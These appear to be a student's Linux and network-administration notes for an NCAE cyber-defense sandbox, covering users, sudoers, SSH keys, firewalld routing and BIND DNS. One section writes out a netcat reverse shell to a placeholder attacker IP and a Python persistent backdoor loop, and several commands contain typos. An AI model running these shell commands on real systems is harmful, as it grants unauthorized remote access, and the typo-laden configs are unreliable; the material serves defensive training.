# NCAE Cyber Sandbox Notes
Section formatting: "[video number, in playlist-order]: [video title]"

See YouTube playlist [here](https://www.youtube.com/playlist?list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M)


## 10: Creating user accounts 👤

### What does the "useradd" command actually do?

e.g. Adding a new user, "bob", with `useradd`:

1. It makes a new **group** called bob
2. It makes a new **user** called bob
3. It creates its home directory at `/home/bob`
4. It copies some standard files for new users from `/etc/skel`, which include stuff like .bashrc (shell config)
5. It prompts a password (with the `passwd` command)
6. It prompts for stuff like full name, "room number", etc. (this gets stored in the /etc/passwd file, but no one really bothers with it)

- Note that, by default, a new user does not have the authority to execute commands as sudo (see vid 13 for more on this)





## 11: Exploring sudoers and removing users 🔒

### "ls -l"

- This `ls` option will list the permissions of a file. Should normally pair this with the `-a` option to show hidden files as well (files with a . at the start of their name)

Example of an `ls -la` entry that I ran in my home directory:
`-rwxr-xr-x  br br    126 KB Wed Dec 15 10:28:22 2021 my_sick_program.o*`
    - Note the first 10 characters of this command (`.rwxr-xr-x`)
    - The first `-` indicates that this listing is _not_ a directory (it would show `d` otherwise)
    - The next three characters (`rwx`) indicate that it is readable, writeable, and executable by the file owner -- `br` (my user)
    - The three characters after (`r-x`) indicate that it is readable, _not_ writeable, and executable by the group associated with the file
    - The last three characters (`r-x`) indicate the same thing as before, but these apply to "everyone else" (that is not the owner or group for the file)

- You can modify permissions with `chmod`, e.g. `chmod +x my_sick_program.o`

- Pop quiz: What does it mean if I do `chmod 777 my_sick_program.o`


### `lsattr`

- This lists the "extended" permissions of a file. This can be useful if you can't modify/delete a file even though it seems like you should be able to (chattr +i)
    - [Read more here](https://wiki.archlinux.org/title/File_permissions_and_attributes#File_attributes)





## 12: Exploring sudoers and removing users ❌

### /etc/:

- "Like the control panel for Linux" (Control center for Mac)


### /etc/sudoers

- This file is mega important
    - If you are root user, or can act as root (with sudo), or are in the root group, then you can read this file (`-r--r-----`)

- The `visudo` command:
    - Use this. Don't `sudo vim` or `sudo nano` the sudoers file.

Example: `%admin ALL=(ALL) NOPASSWD: ALL`
- "Users in the admin group, on any host, may run any command as any user, without a password"
- `%admins` indicates that the following rule will apply to the "admin" **group**. If the `%` was absent, then it would refer to a user called "admin"
- The first `ALL` refers to "all hosts"
- The second `(ALL)` refers to the target users
- The third and final `ALL` refers to "all commands"

### userdel

`sudo usrdel -r <user>` to both remove a user and delete their home directory





## 13: Groups 👥

### groups and id commands

- `groups` and `id` both show you what groups you belong to, but `id` shows you the associated user and group IDs as well
    - Pay attention to what users and IDs get listed on your machine, for example, that may have been created by default.


### usermod command

Example: `sudo usermod -a -G sudo bob`
- Adds the user `bob` to the existing group, `sudo`
- `-a` indicates that we're "appending" aka not creating a brand new group
- `-G` indicates the group name that we're appending to


### /etc/group

- Basically /etc/passwd but for groups (more info about /etc/passwd in vid 13)
    - Most of the ones on here will have been pre-made by your Linux ditribution for stuff like services

- Worth paying attention to this file in competitions
    - What groups have been created?
    - What users have been sneakily added to certain groups such as sudo?





## 14: Passwords and shadow hashes 🥷


### /etc/passwd: User accounts

Example: `bob:x:1001:1001:,,,:/home/bob:/bin/bash`
- First value is just the username (bob)
- Second value (`x`) indicates that the user has a password, and its hash is stored in `/etc/shadow` -- if you remove this x, the user is set to have no password
- Third and fourth value (`1001`) indicate the associated user ID (uid) and group ID (gid)
- Fifth value (`,,,`) stores the full name, room number, etc. that you typically get prompted for when you run `useradd`
- Sixth value: User's home directory
- Seventh value (`/bin/bash`): The command/shell associated with the user. Should be `/sbin/nologin` for accounts that should not be logged in with (e.g. service accounts, or the `nobody` user)


### /etc/shadow: User password hashes

Example: `vivek:$1$fnfffc$pGteyHdicpGOfffXX4ow#5:13064:0:99999:7:::`
- 1: Username
- 2: Password hash
    - The format for this hash is `$hash_type$salt$hashed_password`
    - `$1$` for the hash type indicates that it is an MD5 hash (deprecated, insecure)
    - `$6$` for the hash type indicates that SHA-512 is being used
    - Try this: in python, `import crypt`, then `crypt.crypt("password", "$1$fnfffc$")`
- 3: Last password change (in UNIX time)
- 4: Minimum number of days required between password changes
- 5: Maximum: Max days that the password is valid (forced to change after that)
- 6: Inactive: Number of days after password expires that account is disabled
- 7: Expire: Expiration date of password, expressed as days since Jan 1, 1970

Remember that empty values look like `::` -- e.g., if the second field has no value, then that means the user has no password.





## 16: Services 🌐

If you don't know what a service is (in terms of networking), pls watch the vid cause I won't recap that here.

Some things to think about in regard to services you find in competition:
    - What is its purpose?
    - Does it have a config file? Where?
    - What is its version / vulnerabilities?
    - Is it necessary? ***If not, get rid of it!*** (we've learned this the hard way previously)

- Restarting services:
    - **Do it after editing the settings/config for the service!!!**
    - e.g. `sudo systemctl restart <service_name>` or `sudo service <service_name> restart`
    - Is the server running? i.e. `sudo systemctl status <service_name>` or `sudo service <service_name> status`





## 17: Exploring network configuration 🌐🔧

When we're talking about networking and network configuration, **this is where things start to deviate from Linux ditro to Linux distro**.

e.g. In Debian systems, you may use the `/etc/network/interfaces` file to configure networking, while on Arch Linux you may be making files in `/etc/systemd/networkd/`


- `ifconfig`
    - The deprecated (outdated) Linux command for looking at network information
    - Use the `ip` command instead

- `ip`
    - Most common usage: `ip a` (lists out all network adapters/interfaces along with their associated IPs, MAC addresses, etc. e.g if you have a wifi card, it'll be listed here... hopefully)
    - Note the NAME of your interface... Usually, it'll be `eth0`, or something along the lines of `wl...`. Get the name right when you're modifying your network configs!
    - Loopback interface: What is it used for?





## 18: Static network config in Debian / Kali

In these Debian-based distros, for command-line network config, we're interested in the `/etc/network/interfaces` file.

Example from Kali-External VM on NCAE MiniHack sandbox:
```
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
    address 172.20.0.2
    netmask 255.255.0.0
```

Another example (from my cloud server on linode.com) -- note how this one has slightly more info:
```
auto lo
iface lo inet loopback

source /etc/network/interfaces.d/*

auto eth0

iface eth0 inet6 auto
iface eth0 inet static
    address 194.195.212.122/24
    gateway 194.195.212.1
    up  ip addr add 192.167.227.110/17 dev eth0 label eth0:1
    down  ip addr add 192.167.227.110/17 dev eth0 label eth0:1
```

If we needed to use a DHCP server (i.e. auto-assign IPs):
```
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 dhcp
```

- Pop quiz: what is a netmask?

- Review the MiniHacks network diagram that they are requiring of us
    - Remember, the challenges are accessed through [https://ui.sandbox.ncaecybergames.org/challenges](https://ui.sandbox.ncaecybergames.org/challenges)

**Applying our network config changes**
- What is the command that you always need to apply changes of a config?
    - FYI: The network service in Debian machines is typically called `networking`





## 19: Static network config in CentOS / RedHat Enterprise Linux (RHEL)

CentOS machines do not have a `/etc/network/interfaces` file (they use a different networking service!)

- Instead, the relevant network config directory is `/etc/sysconfig/network-scripts/`
    - There is 1 file per interface, e.g. `ifcfg-eth0` and so on...

- In the MiniHack challenge, they require you to use both interfaces on the machine (eth0 and eth1)
    - Edit the corresponding files

- No nano in CentOS!!!

Example: `/etc/sysconfig/network-scripts/ifcfg-eth0` in MiniHack CentOS (**the router**):
```
TYPE=Ethernet
PROXY_METHOD=none
BROWSER_ONLY=no
BOOTPROTO=dhcp
DEFROUTE=yes
IPV4_FAILURE_FATAL=no
IPV6INIT=yes
IPV6_AUTOCONF=yes
IPV6_DEFROUTE=yes
IPV6_FAILURE_FATAL=no
IPV6_ADDR_GEN_MODE=stable-privacy
NAME=eth0
UUID=ad3643ab-6dac-afa2-e422cc7c0748
DEVICE=eth0
ONBOOT=no
```

- Even though the CentOS machine does not yet have an IP, its config file for eth0 still exists

### Changes made for MiniHack:
- edit `BOOTPROTO=static`
- edit `ONBOOT=yes`
- add `IPADDR=<IP>`
- add `NETMASK=<netmask>`


**Applying our network config changes**
- What is the command that you always need to apply changes of a config?
    - FYI: The network service in CentOS/RHEL is just `network`





## 20: Static network config in Ubuntu

Note that Ubuntu still has a `/etc/network/interfaces` file, but it is not used.

- Newer versions of Ubuntu use "Netplan" (in the `/etc/netplan/` directory) for network config
    - Inside that directory there will typically be "YAML" file(s) containing the network specifications

Example: `/etc/netplan/01-network-manager-all.yaml` in MiniHack Ubuntu (**the web server**):
```
network:
    version: 2
    renderer: NetworkManager
```

Example: `/etc/netplan/01-network-manager-all.yaml` from my Linode Ubuntu instance:
```
network:
    version: 2
    renderer: networkd
    ethernets:
        eth0:
            dhcp4: yes
```

### Changes made for MiniHack
```
...
    ethernets:
        eth0:
            addresses:
                - 192.168.<team_num>.2/24
```

**Applying our network config changes**
- This time around, even though we use netplan `sudo systemctl restart netplan` doesn't seem to work
    - Why? Explore how we could make it work
    - Instead, use: `sudo netplan apply`





## 22: Temporary IPs, permanent IPs, and flushing IPs 🚽

### Temporary IPs with ip a

Adding a temporary IP with `ip a`:
`sudo ip a add 192.168.<team_number>.3/24 dev eth0`

- Note that the above IP is temporary, and thus gets wiped after a restart
    - This is why we learn network configs

- Note on having 2 IPs on one interface: `ifconfig` will not detect both IPs, but `ip a` will


### Flushing the network config (i.e. the IPs assigned to a network interface)

`sudo ipddr flush dev ens18`

- The above does not destroy your network config.





## 23: Netcat (nc) 🙀

[Watch the video](https://www.youtube.com/watch?v=_aIac8hweAg&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=23) if you are unfamiliar with what netcat actually is.

### Nc vs. netcat vs. ncat

There can be some well-justified confusion here.
- For our purposes "nc" and "netcat" refer to the same binary.
- "ncat", on the other hand, is the more feature-rich version of nc, created by the Nmap team.


### Abusing netcat 🙀

Netcat doesn't just allow you to send text back and forth between two hosts, you can __redirect the data that it receives to an application on the computer, e.g. /bin/bash__

Example - Ncat reverse shell:
(On compromised victim machine): `nc <attacker_ip> 54321 -e /bin/bash`
(On attacker machine): nc `nc -lvnp 54321`

After the above, the attacker should now have a shell (terminal access) on a vicitm computer (if the above command doesn't work, it may be because you are using a primitive verison of netcat such as nc, instead of ncat).


### Creating a (crappy) persistent backdoor with Python

```
import os
while True:
    os.system("nc -l -p 54321 -e /bin/bash");'
```

* video says ctrl+Z "quits" the python while loop instead of backgrounding it?

can anyone figure out how to one-line this?
    - this does't work:`python -c 'import os; while True: os.system("nc -l -p 54321 -e /bin/bash");'`





## 24: Web services with Apache 🌍

* Apache
    - A free and open source HTTP server that's been around for ages

* A good place to start looking for files or configs for services: `/etc/`
    - For apache, the web server port and root directory are located in `/etc/apache2/sites-available/000-default.conf`
    - Sometimes the root of the web server will be `/var/www`, other times `/var/www/html`

* How to start the server? `systemctl` (in Ubuntu), just like we've used before
    - `sudo systemctl enable --now apache2`





## 25: Router configuration and MiniHack completionn 📡

We have the two network interfaces configured... what now? We're still not routing traffic through the router machine to their destination (show diagram)

* In our configuration, remember that the CentOS machine is being designated as a router.
    - Pop quiz: what is a router? What makes it different from a modem?
    - Double pop quiz: what does "modem" mean?


### Firewalld - zones

In terms of __routing the network traffic the way we want__, the Linux firewall program "firewalld" will be doing the magic for us.

On CentOS machines:
* Get info about the current firewall setup: `sudo firewall-cmd --list-all-zones`
    - A bunch of "zones" get spat out: block, dmz (what's a dmz?!), drop, external, home, internal, public, trusted, work,
    - Pop quiz: what to do when the output of a terminal program is not big enough to fit on the screen all at once?
    - Check to see what zone your current network interfaces are associated with (in the MiniHack setup eth0 and eth1 are listed under the "public" zone.)

* What are the default __network services__ associated with each zone?
    - dhcp: Think of this service as the thing that assigns IPs to stuff on a network that isn't statically configured (e.g. your home wifi). It does other stuff too.
    - ssh: Our beloved secure remote shell-providing service
    - mdns: A DNS service to resolve domains (e.g. google.com) to IP addresses.
    - samba-client: a software package to allow Linux systems to interact with Windows networks.

* Notice that not every zone has the same defaults.
    - e.g. `external` only has the ssh service enabled by default, `internal` has dhcp, mdns, samba-client, ssh.
    - We're supposed to be routing traffic to a web server... so where is the HTTP service? We'll get to this soon.

* Command to list info about a specific zone: `sudo firewall-cmd --list-all --zone=<zone name>`

Let's think about this... we know that machines in our target network diagram are either laballed as "internal" or "external"
    - ...it would make sense, then, that our two interfaces lie the internal and external zones, correspingly.


### Assigning network interfaces to zones with the CentOS ifcfg configs

Remember that the network diagram specifies that the external router IP be `172.20.#.1/16`, and that the internal router IP be `192.168.#.1/24`.

* As it turns out, you can specify the zone for firewall-cmd in the same file in CentOS that we used to statically configure its network settings
    - The filepath, as a reminder, is `/etc/sysconfig/network-scripts/ifcfg-interfacename`
    - Simply add a new line at the bottom such as `ZONE=external`

* Remember what we need to do every time we update a config file for a service
    - For CentOS, the service name is `network` as we've said before => `sudo systemctl restart network`

* What is "masquerading"?


### Alternative to ifcfg zone assignment: Using firewall-cmd commands

`sudo firewall-cmd --change-interface=eth1 --zone=internal --permanent`

Note the usage of `--permanent`. Without it, your zone changes will not persist after reboot.
    - The downside of `--permanent` is that stuff doesn't apply until after you reboot... so you have to run `sudo firewall-cmd --reload`


### What is this "masquerading"?

* External zone: What is "masquerading"?
    - Masquerading will allow our internal devices to use the machine as a router and connect to the external network
    - Now how do we make external traffic get to the internal machines? The answer is __port forwarding__.


### Port forwarding

`sudo firewall-cmd --zone=external --add-forward-port=port=80:proto=tcp:toport=80:toaddr=192.168.<team_number>.2 --permanent`

* Remember to run `firewall-cmd --reload` to apply the rule.

Now that we have configured port-forwarding, external network traffic can reach our internal web server, but __not the other way around__...

* We port-forwarded, and masquerading is enabled, so what's missing to let the server find its way back out?
    - Answer: Gateways.
    - __Q: What is a gateway?__ Maybe you've heard of a "default gateway" when messing aronud with network settings on your PC?


### Configuring the gateway on our web server machine

* On Ubuntu, this is done in the network config file we were editing before when statically configuring its IP.
    - The filepath is something like `/etc/netplan/01-network-manager-all.yaml`

* We have the IP address specified in this file, but not the gateway
    - We need to add the line `gateway4: 192.168.<team_number>.1`
    - Be careful about indentation or else YAML will flip out
    - Q: what does YAML stand for? 🤓

__Our final file for the Ubuntu machine should look like:__

```
network:
    version: 2
    renderer: NetworkManager
    ethernets:
        ens18:
            addresses:
                - 192.168.<team_number>.2/24
            gateway4: 192.168.<team_number>.1
```

* Remember to apply your changes with `sudo netplan apply`

* Restart apache2 (our web service) as well: `sudo systemctl restart apache2`

__Repeat a similar process on the Kali machine__, except instead of editing this funky YAML file, we edit the `/etc/network/interfaces` file so that it looks like:
```
source /etc/network/interfaces.d/*

auto lo
iface lo inet lopback

auto eth0
iface eth0 inet static
    address 192.168.<team_num>.100
    netmask 255.255.255.0
    gateway 182.168.<team_num>.1
```

* Now the traffic should be getting routed properly!

Q: How do we list our current gateways in Linux?

Q: Do we need a gateway on External Kali? Why or why not?

__TIDBIT FROM THE VIDEO__:
- "This is a microcosm of the real event"
- On competition day, we'll have to do more configuration, more complex services, more requirements.
- While we are doing this, we will also have the red team attacking us.
    - Make sure we have backups, be semi-knowledgeable about different network services...
    - __LOGGING.__ Auditd?





## 26: ROUTING AND NETWORK CONFIGURING REVIEW 📓

- Basically what it sounds like. Go through [the video](https://www.youtube.com/watch?v=AujsQji3A1Q&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=26) if you want a "speedrun" of all the steps to get the network traffic to route as specified in the MiniHack diagram.





## 27: SSH Basics

Let's say we now want to use SSH on our Ubuntu Server machine, along with the web server functionality we already gave it.

* __Bottom line__: when you want to connect to a computer/server remotely, SSH is one of your go-to tools (particuarly for Linux)

* Question: are you running the SSH service on your machine without knowing?
    - `sudo systemctl status ssh`
    - On CentOS or other distros, you sometimes have to add a "d" to the end of service names (Q: what does the d mean?), e.g. `sudo systemctl status sshd`

As it turns out, the Ubuntu machine already had an SSH service running.

### SSH Configs

* Next step: Where are configuration files stored for this service?
    - Remember the first place to start looking for these: `/etc/`
    - Take a second to explore the files in the `/etc/ssh` directory.

* `ssh_config`
    - Notice all of the stuff in this file that's commented out
    - Notice the include statement at the beginning. This file does not just work by itself.

* `sshd_cohfig`
    - Q: What could be the purpose of this as opposed to `ssh_config`?

__Potential Security Threat:__ Note that malicious changes to your SSH config don't have to go specifically in one of the two above files, they can also go in the included ones.
    - Something to consider: How important are these included files? Safer to just delete them?

* General syntax to log in with SSH
    - `ssh <usrname>@<host>`, e.g. `ssh ben@192.168.20.6`
    - Q: How do we exit?
    - Q: How does SSH know to trigger the first-time connection prompt?


## 28: SHH keys

SSH has the option to use __assymetric-key authentication__ (public and private keys).

Go to [1:10 in the video](https://www.youtube.com/watch?v=GivTVjSUjRM&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=28) for a useful diagram.

* The three main SSH cryptographic algorithms to keep in mind (are there more available?):
    - RSA (as in `id_rsa_key`)
    - Ed25519 (as in `id_ed25519_key`)
    - ECDSA (as in `id_ecdsa_key`)

* Check out the permissions on the private keys vs. the public keys

**Remember one of our key points about key rotation/re-generation in the CCDC reflections?**

### The ssh-keygen command (AKA HOW TO ROTATE/CREATE NEW KEYS!)

Example:
`sudo ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key`


* Important note about passphrases: it is actually reasonable to not set any sometimes, because this allows passwordless auth
    - you would typically want this to set up SSH keys for a website like GitHub

When giving a website/an API your SSH key, make sure you're giving it the public key, not the private key!!!

* Demo: Take a look at what happens when you try to SSH into a server that just changed its public key file.





## 29: Passwordless shell access 🗝️🚫

We now know of two ways that public key cryptography is ussed in SSH:
1. To identify an SSH server (e.g. ensure it's the legit one by comparing the public key, as opposed to a spoofed one with the same IP)
2. To let clients remotely SSH into a server without needing to type the server's user password (a client needs to generate a new, separate key. This is not the same key that the server uses to identify itself)

* The question now, is: How do we setup #2?
    - That is, how do we set up SSH keys to log in without user passwords?

### The easy, painless way to do all of the stuff below

Those were a lot of steps to configure an ssh key authentication for one user. Let's make it easier:

1. Generate a new key for a different user, e.g. `ssh-keygen -t ecdsa -f /home/sandbox/id_sandbox_key`
2. Use the __ssh-copy-id__ command: `sudo ssh-copy-id -i /home/sandbox/id_sandbox_key sandbox@192.168.8.2`
    - The above command was ran on the Ubuntu MiniHack machine (the web server)
    - The result of the command is that we now have an `authorized_keys` file on the sandbox user that contains the public key that we recently generated, and subsequently, we logged into our own machine through SSH.

__Keep reading below for the manual way to do all of this (good to understand)__.


### The <user home directory>/.ssh/authorized_keys file

If I'm a user, "bt", then we can go to into (or make, if it doesn't exist) the directory `/home/bt/.ssh` directory, and create a file called `authorized_keys` to specify the __public keys__

* Use the keygen command that we learned before to make a key, and copy the contents of the .pub file into this `authorized_keys` file.
    - If you have multiple public keys that are authorized, enter them each in their own line within this file.


### Key file permission

The SSH service may not trust a key regardless of what you tell it, if it doesn't have the appropriate permissions.

 * We saw this in our practice on March 27th (think back to the demo of me trying to cat out one of my SSH private keys which was not possible because of its permissions)
    - `ls -la` to list the SSH keys in the directory along with their permissions

* Generally, public keys should have "644" permissions
    - That is, `chmod 644 <keyfile>`
    - This gives read+write to the owner, and only read to both the group and everyone else.

* Generally, private keys should be "600" permissions
    - read+write to only owner

* For the `.ssh` folder, permissions should ne "700"
    - This may not be what the folder has by default, if, e.g. you created the folder with `sudo mkdir`
    - 700 => read+write+execute

### The chown and chomd commands

"Change ownership"

* Example: changing the user and group for the .ssh folder for a user called bob:
    - `sudo chown bob:bob /home/bob/.ssh`
    - The first `bob` indicates the user, bob, and the second `bob` indicates the group, bob.

We can then also grant ownership to bob for the `authorized_keys` if it's not already owned by them: `sudo chown bob:bob /home/bob/.ssh/authorized_keys`

* Authorized keys file should have "644" permissions on it
    - `chmod 644 /home/bob/.ssh/authorized_keys`
    - rea+write to owner, read to group, read to everyone else.


### Now, how does a remote SSH user use their private key to connect?

If you generated the remote user's private key on your own server, you can actually transfer it over with SSH itself to get it back to them.

* Example using the `scp` command:
    - The following sample command is executed from the remote user machine
    - `scp sandbox@<ubuntu_machine_ip>:<filepath on SSH server where you generated the private key> ./`
    - If you get a permission denied error, ensure that the user you're trying to scp has even has access to the file you want to copy over. Fix perms with `chown` or `chmod` as needed.


### Logging in passwordlessly after setting up authorized key and transferring it over to the appropriate remote user

* The key thing here: using the `-i` option in the ssh command

* Example: `ssh -i /home/sandbox/id_bob_key bob@<ubuntu_machine_ip>`

If you have the aforementioned permissions correctly set for everything, then congrats! You have now used an SSH key to passwordlessly log in to a remote server.

* You now understand why it is so important to keep track of keys and make sure no keys for malicious users are present
    - __Even if you change a user's password, if the same SSH key still exists, then they can log in regardless!__





## 30: SSH service through a router 🐚📡

Remember how some of our firewalld zones had certain services enabled?

If a service is enabled for a certain zone, that service's traffic will be allowed through.
If not, then it will be blocked.

* Remember the command to list your zones and their options: `sudo firewall-cmd --list-all-zones`

### Restricting SSH traffic to router only to internal machines

`sudo firewall-cmd --zone=external --permanent --remove-service=ssh`

* Reload to apply changes, like usual: `sudo firewall-cmd --reload`
    - Confirm changes applied with `sudo firewall-cmd --list-all --zone=external`

To undo changes and add back ssh to the zone:
`sudo firewall-cmd --zone=external --permanent --add-service=ssh`
`sudo firewall-cmd --reload`


### SSH port forwarding

Similar to what we did for forwarding HTTP traffic:
`sudo firewall-cmd --zone=external --add-forward-port=port=22:proto=tcp:toport=22:toaddr=<ubuntu_machine_ip> --permanent`


**Question:** If we have SSH enabled as a service on the external zone, and also have the port-forwarding rule, what will happen when we try SSHing into the router? Will it give us an SSH session directy on the router or will it give us a session on on the machine it's configured to forward to?

Spoiler alert: It sends tour SSH traffic to the forwarded internal machine
    - At the 12:19 mark in [the video](https://www.youtube.com/watch?v=NzitxTqu2o0&list=PLqux0fXsj7x3WYm6ZWuJnGC1rXQZ1018M&index=30), it shows how it even displays the "Remote host authenticity has changed" SSH warning. This makes sense, because we had SSH'd into the router machine at some point before, so the fact that the same IP in the SSH command now gets forwarded to a new machine should trigger this alert.

* To remove any warnings from servers that you know will have their SSH identities changed, you can delete the `.ssh/known_hosts` file (or just remove the line within the file associated with the server whose identity you know will change)


Q: What settings would we change in the zone options if we wanted to be able to SSH into the router itself?





## 31: DNS 101

DNS is one of the more challenging services to configure.

### Forward lookups

A DNS forward lookup is the client asking the DNS server:
"Hey DNS... where is 'ncaecybergames.org'?"

### Reverse lookups

A DNS reverse lookup on the other hand, is:
"Hey DNS... where is '192.168.1.99'?"


### Cofiguring DNS on the Ubuntu machine

We've configured our Ubuntu machine to now be both a web server and an SSH server, so let's just keep using this one and configure DNS on it.

We will be using the __"bind"__ Linux DNS program in this case.
    - install it w/ `sudo apt install bind` if not installed.

* Go to the bind config folder in `/etc/bind` and look at the files in it
    - When referring to the name of the service that bind runs as for DNS, you will likely see "named" as its name.
    - For our purposes let's just say that bind and named refer to the same service (named is technically a subset of the bind software suite)

* Check the status of our bind/named DNS service: `systemctl status named`


## named.conf

In the Ubuntu MiniHack machine, this config file is just 3 include statements for other files.

This may not be the case for default named.conf files.
```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";
```


### What is our goal here?

A: To get our web server's IP (`192.168.<team_number>.2`) to be associated with a domain name -- ncaecybergames.org -- that we can type out in a web browser to load the webpages we're hosting


### named.conf.default-zones

This files has some zones already added, so we use them as templates to add our own zone:

Forward-lookup zone (append these lines at end of file):
```
zone "ncaecybergames.org" IN
    type master;
    file "/etc/bind/zones/forward.ncaecybergames.org";
    allow-update { none; };
};
```

Reverse-lookup zone:
```
zone "<team_number>.168.192.in-addr.arpa" IN
    type master;
    file "/etc/bind/zones/reverse.ncaecybergames.org";
    allow-update { none; };
};
```
* Note for reverse-lookup bind zone definitions:
    - bind expects you to write the IP in reverse order
    - This is called a reverse-ARPA address
    - Also note that we left out the .2 that was at the end of our Ubuntu machine, that is because that octet of our netmask was not set, so it does not get included in the reverse ARPA notation (or something along those lines)

* Next, `sudo mkdir /etc/bind/zones`

* We can use some of the other files that were referenced in the  default-zones.conf to use as a template for our forward.ncaecybergames.org and reverse.ncaecybergames.org files
    - e.g. `/etc/bind/db.empty`
    - Take a look at the one above and use it to make the new files for our domain

`sudo cp db.empty /etc/bind/zones/foward.ncaecybergames.org`
`sudo cp db.empty /etc/bind/zones/reverse.ncaecybergames.org`

* Another good reason why you should copy the empty.db file instead of making your own is that it already has the correct file ownership and permissions set.

⭕ The __original db.empty file__ looks like this:
```
; BIND reverse data file for empty rfc1918 zone
;
; DO NOT EDIT THIS FILE - it is used for multiple zones.
; Instead, copy it, edit named.conf, and use that copy.
;
$TTL	86400
@	IN	SOA	localhost. root.localhost. (
			      1		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			  86400 )	; Negative Cache TTL
;
@	IN	NS	localhost.
```

⏩ The __edited__ forward.ncaecybergames.org file should look like:
```
; BIND reverse data file for empty rfc1918 zone
;
; DO NOT EDIT THIS FILE - it is used for multiple zones.
; Instead, copy it, edit named.conf, and use that copy.
;
$TTL	86400
@	IN	SOA	ncaecybergames.org root (
			      2		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			  86400 )	; Negative Cache TTL
;
@	IN	        NS	    sandbox-Ubuntu
sandbox-Ubuntu  IN A    192.168.<team_number>.2
www             IN A    192.168.<team_number>.2
```
    - This file resolves requests for ncae.cyberganes.org and its associated subdomains (sandbox-Ubuntu.cybergames.org, www.cybergames.org)
    - Note the places where localhost was changed (either to ncaecybergames.org (near top of file) or to sandbox-Ubuntu (near botto of file)
    - Note also the fact that in this example, our "host name" or machine/PC name is "sandbox-Ubuntu". This is something that you can actually tell when you use the terminal because it's the string that comes after the `@`
    - e.g. if my terminal shows `ben@work-laptop:~ ` then I know my host name is "work-laptop"

🔙 The edited reverse.ncaecybergames.org file should look like:
```
; BIND reverse data file for empty rfc1918 zone
;
; DO NOT EDIT THIS FILE - it is used for multiple zones.
; Instead, copy it, edit named.conf, and use that copy.
;
$TTL	86400
@	IN	SOA	ncaecybergames.org. root.ncaecybergames.org. (
			      2		; Serial
			 604800		; Refresh
			  86400		; Retry
			2419200		; Expire
			  86400 )	; Negative Cache TTL
;
@	IN	        NS	    sandbox-Ubuntu
2   IN PTR      www.ncaecybergames.org.
2   IN PTR      sandbox-Ubuntu.ncaecybergames.org.
```
    - Note that unlike the forward address zone file, we don't keep trailing periods after domain names (eg. `ncaecybergames.org`), but in the reverse, we do (e.g. `ncaecybergames.org.`, `root.ncaecybergames.org.`)
    - Also note the importance of the `2` in the @ field above. This is the converse of the last ARPA notation where we wrote the whole reverse IP excluding the the 2 from the last octet of the IP address.

* __Every single time you open and edit the zone definition files for our domain, you need to increment the serial number!__
    - Increment it every time you make a change to the file


### Setting the DNS server

`sudo systemctl start named`
`sudo systemctl status named` -- check the messages at the bottom of the output

* You'll notice that even if no errors pop up, going to www.ncaecybergames.org on the MiniHack Ubuntu's web browser still won't resolve to anything
    - **This is because we haven't told the computer where to look for its DNS server** (which in this case is just itself)


* The main way is in `/etc/resolv.conf`:
    - An important file in Linux, it usually contains your DNS server and may have a bunch of DNS IPs in there by default (e.g. the famous 1.1.1.1 (Cloudflare public DNS server) or 8.8.8.8 (Google public DNS server)
    - Simply add a line to specify our DNS server: `nameserver 192.168.<team_number>.2`

__Now you should be able to access your own web server through its DNS domain that you configured with bind!__ e.g. Open up Firefox and type in www.ncaecybergames.org

* Another way to specify the DNS server would be in the `/etc/netplan/01-network-manager-all.yaml` file that we've used and edited before
    - You can look this up if you want, but not necessary since we have resolv.conf -- which I think is a more standardized way of setting DNS servers.


### nslookup

Using firefox to test the DNS configuration is all well and good, but `nslookup` is the tool you want to use to test this kind of stuff, generally.

* Example: `nslookup 192.168.8.2`
Output:
```
2.8.168.in-addr.arpa    name = sandbox-Ubuntu.ncaecybergames.org
2.8.168.in-addr.arpa    name = www.ncaecybergames.org
```





## 32: DNS - Additional zones 📚🔳

### Setting the DNS server for other local machines

What if we wanted to set the Ubuntu machine as the DNS server for other machines on the local network?

* Simple: Just edit the `/etc/resolv.conf` file, in this case, for the internal kali machine
    - add the `nameserver 192.168.<team_number>.2` line at the end


### Adding subdomains for other websites to our DNS configuration

Let's say we want to program our DNS setup to map the scoring server to `score.ncaecybergames.org`.

* Open and edit `etc/bind/zones/forward.ncaecybergames.org` file that we made before (on Ubuntu)
    - after the `sandbox` and `www` entries at the bottom of the file, add an entry for `score`
    - e.g. `score       IN A    172.20.0.1`

* Restart the service
    - `sudo systemctl restart named`

* Confirm the change with nslookup:
    - `nslookup score.ncaecybergames.org`


### Reverse lookup for an IP not listed in our named.conf.default-zones file
* What if we wanted the reverse looup to work?
    - i.e. what if we wanted it to associate the IP 172.20.0.1 with the domain score.ncaecybergames.org

We have to go back to our `/etc/bind/named.conf.default-zones` file and add a new zone block:
```
zone "20.172.in-addr.arpa" IN {
    type master;
    file "/etc/bind/zones/reverse.ncaecybergames.org";
    allow-update { none; };
};
```

* Now we can go make our change to the reverse.ncaecybergames.org file
    - __Make sure you increment the serial number again since we're making a new change!__
    - The line you add to this file is `1.0.    IN PTR  score.ncaecybergames.org.`

* Restart named: `sudo systemctl restart named`

* Confirm with nslookup: `nslookup 172.20.0.1`





## 33: DNS service through a router 📚📡

We're gonna route DNS traffic now, similar to what we did for web traffic.

Scenario: The external kali machine has no access to the DNS server currently (remember the only pot that we port-forwarded was 80 for HTTP)

One potentially confusing quirk about doing this:
    - Because external traffic has to go through the router, we actually need to set the DNS server for external machines to be the router's (external) IP


### Set the DNS server to be our router's external IP

Simply create/edit `/etc/resolv.conf` and add the `nameserver 172.20.<team_number>.1` line.


### Forward DNS traffic on the CentOS (router) machine

`sudo firewall-cmd --zone=external --permanent --add-forward-port=port=53:proto=udp:toport=53:toaddr=192.168.<team_number>.2`

__Important thing to note about the above command:__
    - DNS does NOT run on TCP. It runs over UDP (note the `proto=udp`)

* Reload: `sudo firewall-cmd --reload`

* Confirm with `sudo firewall-cmd --list-all --zone=external`

* Confirm on external kali machine with `nslookup www.ncaecybergames.org`





## 34: The Rsync service ♻️

